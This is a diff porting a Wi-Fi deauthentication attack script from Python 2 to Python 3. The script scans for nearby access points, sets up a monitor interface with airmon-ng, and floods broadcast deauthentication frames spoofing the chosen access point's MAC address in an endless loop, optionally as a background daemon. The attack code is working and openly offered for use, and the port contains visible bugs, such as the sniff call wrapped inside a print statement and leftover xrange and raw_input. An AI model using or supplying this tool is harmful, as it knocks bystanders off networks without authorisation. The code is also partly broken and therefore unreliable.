@@ -1,12 +1,12 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 """
 Sends deauth packets to a wifi network which results network outage for connected devices.
 """
 __author__ ="Veerendra Kakumanu (veerendra2)"
 __license__ = "Apache 2.0"
-__version__ = "3.1"
+__version__ = "3.2"
 __maintainer__ = "Veerendra Kakumanu"
-__credits__ = ["Franz Kafka"]
+__credits__ = ["Franz Kafka","Leandre Longatte"]
 
 import os
 import sys
@@ -21,7 +21,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 try:
     import scapy.all
 except ImportError:
-    print "[-] scapy module not found. Please install it by running 'sudo apt-get install python-scapy -y'"
+    print ("[-] scapy module not found. Please install it by running 'sudo apt-get install python-scapy -y'")
     exit(1)
 
 scapy.all.conf.verbose = False
@@ -39,12 +39,13 @@ PATTREN = {"MAC Address": 'Address:(.*)',
 
 
 def banner():
-    print "\n+----------------------------------------------------------------+"
-    print "|Deauth v3.1                                                     |"
-    print "|Coded by Veerendra Kakumanu (veerendra2)                        |"
-    print "|Blog: https://veerendra2.github.io/wifi-deathentication-attack/ |"
-    print "|Repo: https://github.com/veerendra2/wifi-deauth-attack          |"
-    print "+----------------------------------------------------------------+\n"
+    print ("\n+----------------------------------------------------------------+")
+    print ("|Deauth v3.2                                                     |")
+    print ("|Coded by Veerendra Kakumanu (veerendra2)                        |")
+    print ("|Ported on python3 by Léandre Longatte (LongatteL)               |")
+    print ("|Blog: https://veerendra2.github.io/wifi-deathentication-attack/ |")
+    print ("|Repo: https://github.com/veerendra2/wifi-deauth-attack          |")
+    print ("+----------------------------------------------------------------+\n")
 
 
 def execute(cmd, verbose=False):
@@ -54,21 +55,21 @@ def execute(cmd, verbose=False):
         line = p.stdout.readline()
         out.append(line)
         if verbose:
-            print line,
+            print (line),
         if not line and p.poll() is not None:
             break
     if p.returncode != 0:
-        print p.stderr.read().strip()
+        print (p.stderr.read().strip())
         return 1
     else:
-        return ''.join(out).strip()
+        return ''.join(str(out)).strip()
 
 
 def daemonize():
     if os.fork():
         os._exit(0)
     os.chdir("/")
-    os.umask(022)
+    os.umask(0o022)
     os.setsid()
     os.umask(0)
     if os.fork():
@@ -80,7 +81,7 @@ def daemonize():
     os.dup2(stdout.fileno(), 2)
     stdin.close()
     stdout.close()
-    os.umask(022)
+    os.umask(0o022)
     for fd in xrange(3, 1024):
         try:
             os.close(fd)
@@ -100,12 +101,12 @@ class CreatIface:
                 self.Iface = re.findall(r'(.*):', f.read())[0].strip()
                 return self.Iface
         except:
-            print RED+"[-] Wireless interface not found"+ENDC
+            print (RED+"[-] Wireless interface not found"+ENDC)
             while 1:
                 iface = raw_input("Please enter wireless interface name> ").strip()
                 if iface:
                     self.Iface = iface
-                print RED+"[-] Please specify wireless interface name"+ENDC
+                print (RED+"[-] Please specify wireless interface name"+ENDC)
                 continue
 
     def readDevFile(self, verbose=True):
@@ -120,15 +121,15 @@ class CreatIface:
 
     def createmonIface(self):
         if not self.monIface:
-            print "[.] Attempting start airmon-ng"
+            print ("[.] Attempting start airmon-ng")
             exit_status = execute("airmon-ng start {} > /dev/null 2>&1".format(self.Iface))
             if exit_status == 1:
-                print RED+"[-] Something went wrong. Check wireless interface?, is airmon-ng working?"+ENDC
+                print (RED+"[-] Something went wrong. Check wireless interface?, is airmon-ng working?"+ENDC)
                 exit(1)
             self.readDevFile(False)
         if self.Iface and self.monIface:
-            print "[*] Wireless interface   : " + self.Iface
-            print "[*] Monitoring interface : " + self.monIface
+            print ("[*] Wireless interface   : " + self.Iface)
+            print ("[*] Monitoring interface : " + self.monIface)
 
 
 def spinner():
@@ -165,19 +166,19 @@ class sniffWifi(object):
             return False
 
     def runSniff(self): #Sniffing Here!
-        print "[+] Monitoring wifi signals, it will take some time(or use '-w' option). Please wait.....",
-        scapy.all.sniff(iface=self.mon, prn=self.packetHandler, stop_filter=self.stopFilter)
-        print "\n"
+        print ("[+] Monitoring wifi signals, it will take some time(or use '-w' option). Please wait.....",
+        scapy.all.sniff(iface=self.mon, prn=self.packetHandler, stop_filter=self.stopFilter))
+        print ("\n")
         return self.ap_list
 
 
 def get_aplist(Iface):
     result = None
     ap = dict()
-    print "[+] Running : sudo iwlist {} s".format(Iface)
+    print ("[+] Running : sudo iwlist {} s".format(Iface))
     for x in range(3): #Sometimes it command is not running
         if x == 2:
-            print RED+"[-] Something went worng. 'iwlist' working? or run-> service network-manager restart"+ENDC
+            print (RED+"[-] Something went worng. 'iwlist' working? or run-> service network-manager restart"+ENDC)
             exit(1)
         try:
             result = subprocess.check_output("sudo iwlist {} s".format(Iface), shell=True)
@@ -186,12 +187,15 @@ def get_aplist(Iface):
             continue
     for name, pattern in PATTREN.items():
         PATTREN[name] = re.compile(pattern)
-    for line in result.split("Cell"):
-        if line and "Scan completed" not in line:
-            mac = PATTREN["MAC Address"].findall(line)[0].strip()
-            ssid = PATTREN["ESSID"].findall(line)[0].strip('"')
-            ids = str(int(PATTREN["ID"].findall(line)[0].strip()))
+    for line in result.split(b'Cell'):
+        if line and b'Scan completed' not in line:
+            dmac = PATTREN["MAC Address"].findall(str(line))[0].strip()
+            mac = (dmac.split("\\n"))[0]
+            dssid = PATTREN["ESSID"].findall(str(line))[0].strip('"')
+            ssid = (dssid.split("\\n"))[0][:-1]
+            ids = str(int(PATTREN["ID"].findall(str(line))[0].strip()[-2:]))
             ap.setdefault(ids, [mac, ssid])
+    print(ap)
     return ap
 
 
@@ -203,53 +207,53 @@ def manage_process(status): # 0 for Check & 1 for kill
     except: pass
     if not daemon_pid:
         if status == 1:
-            print "[-] 'Deauth daemon' is not running"
+            print ("[-] 'Deauth daemon' is not running")
     else:
         if status == 0:
-            print "[+] 'Deauth daemon' is already running with pid {}".format(daemon_pid)
+            print ("[+] 'Deauth daemon' is already running with pid {}".format(daemon_pid))
             exit(0)
         elif status == 1:
             os.kill(int(daemon_pid), signal.SIGTERM)
             try:
                 os.remove(PID_FILE)
             except: pass
-            print "[*] Deauth daemon killed"
+            print ("[*] Deauth daemon killed")
             exit(0)
 
 
 def send_deauth(mac, mon):
     pkt = scapy.all.RadioTap()/scapy.all.Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=mac[0], addr3=mac[0])/scapy.all.Dot11Deauth()
-    print GREEN+"[*] Sending Deauthentication Packets to -> "+mac[1]+ENDC
+    print (GREEN+"[*] Sending Deauthentication Packets to -> "+mac[1]+ENDC)
     while True:
         try:
             sys.stdout.write("\b{}".format(next(spin)))
             sys.stdout.flush()
             scapy.all.sendp(pkt, iface=mon, count=1, inter=.2, verbose=0)
         except KeyboardInterrupt:
-            print "\n"
+            print ("\n")
             exit(0)
 
 
 def render_ouput(ap):
     if not ap:
-        print RED+"[-] Wifi hotspots not found near by you."+ENDC
+        print (RED+"[-] Wifi hotspots not found near by you."+ENDC)
         exit(1)
-    print "+".ljust(5, "-")+"+".ljust(28,"-")+"+".ljust(20, "-")+"+"
-    print "| ID".ljust(5, " ")+"|"+"     Wifi Hotspot Name     "+"|"+"    MAC Address    |"
-    print "+".ljust(5, "-")+"+".ljust(28, "-")+"+".ljust(20, "-")+"+"
+    print ("+".ljust(5, "-")+"+".ljust(28,"-")+"+".ljust(20, "-")+"+")
+    print ("| ID".ljust(5, " ")+"|"+"     Wifi Hotspot Name     "+"|"+"    MAC Address    |")
+    print ("+".ljust(5, "-")+"+".ljust(28, "-")+"+".ljust(20, "-")+"+")
     for id, ssid in ap.items():
-        print "|", str(id).ljust(3, " ")+"|", ssid[1].ljust(26, " ")+"|", ssid[0].ljust(17, " ")+" |"
-    print "+".ljust(5, "-")+"+".ljust(28,"-")+"+".ljust(20, "-")+"+"
+        print ("|", str(id).ljust(3, " ")+"|", ssid[1].ljust(26, " ")+"|", ssid[0].ljust(17, " ")+" |")
+    print ("+".ljust(5, "-")+"+".ljust(28,"-")+"+".ljust(20, "-")+"+")
     while 1:
         try:
-            res = raw_input("Choose ID>>")
+            res = input("Choose ID>>")
             if res in ap:
                 break
         except KeyboardInterrupt:
-            print "\n"
+            print ("\n")
             exit(0)
         except: pass
-        print "Invalid option. Please try again\n"
+        print ("Invalid option. Please try again\n")
     return ap[res]
 
 
@@ -270,7 +274,7 @@ if __name__ == '__main__':
     parser.add_argument('-v', action='version', version='%(prog)s 3.1')
     results = parser.parse_args()
     if not os.geteuid() == 0:
-        print RED+"[-] Script must run with 'sudo'"+ENDC
+        print (RED+"[-] Script must run with 'sudo'"+ENDC)
         exit(1)
     if results.kill:
         manage_process(1)
@@ -282,13 +286,13 @@ if __name__ == '__main__':
     Interface = CreatIface()
     if results.mac:
         if not re.search(r'(?:[0-9a-fA-F]:?){12}', results.mac.strip()):
-            print RED+"[-] Incorrect MAC address format. Please check", results.mac.strip()+ENDC
+            print (RED+"[-] Incorrect MAC address format. Please check", results.mac.strip()+ENDC)
             exit(1)
         if not Interface.Iface:
             Interface.getWIface()
         Interface.createmonIface()
         if results.daemon:
-            print GREEN+"[*] Running as daemon. Wrote pid :" + PID_FILE+ENDC
+            print (GREEN+"[*] Running as daemon. Wrote pid :" + PID_FILE+ENDC)
             daemonize()
             write_pid()
         send_deauth([results.mac.strip(), results.mac.strip()], Interface.monIface)
@@ -300,12 +304,12 @@ if __name__ == '__main__':
             wifi = render_ouput(ap_list)
             Interface.createmonIface()
         else:
-            print "[.] Overriding option '-w'. Look like there is already mon interface exits. Fallback to airmon-ng sniffing"
+            print ("[.] Overriding option '-w'. Look like there is already mon interface exits. Fallback to airmon-ng sniffing")
             Interface.createmonIface()
             sniff = sniffWifi(Interface.monIface, PACKET_COUNT)
             wifi = render_ouput(sniff.runSniff())
         if results.daemon:
-            print GREEN+"[*] Running as daemon. Wrote pid :"+PID_FILE+ENDC
+            print (GREEN+"[*] Running as daemon. Wrote pid :"+PID_FILE+ENDC)
             daemonize()
             write_pid()
         send_deauth(wifi, Interface.monIface)
@@ -316,7 +320,7 @@ if __name__ == '__main__':
         sniff = sniffWifi(Interface.monIface, PACKET_COUNT)
         wifi = render_ouput(sniff.runSniff())
         if results.daemon:
-            print GREEN+"[*] Running as daemon. Wrote pid :" + PID_FILE+ENDC
+            print (GREEN+"[*] Running as daemon. Wrote pid :" + PID_FILE+ENDC)
             daemonize()
             write_pid()
         send_deauth(wifi, Interface.monIface)
